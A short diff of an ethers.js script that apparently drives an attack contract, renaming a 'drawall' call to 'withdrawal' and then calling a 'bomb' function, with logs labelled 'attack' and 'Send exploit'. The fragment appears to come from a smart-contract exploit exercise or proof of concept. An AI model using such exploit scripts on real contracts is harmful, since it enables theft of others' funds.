@@ -28,7 +28,7 @@ async function main () {
 
     console.log("Before attack contract balance: ", bal);
 
-    let tx_1 = await a_deploy.drawall({value: eth});
+    let tx_1 = await a_deploy.withdrawal({value: eth});
     eth = ethers.parseEther("0.01")
     let tx_2 = await a_deploy.bomb({value: eth});
     console.log("Send exploit (1): ", tx_1.hash);
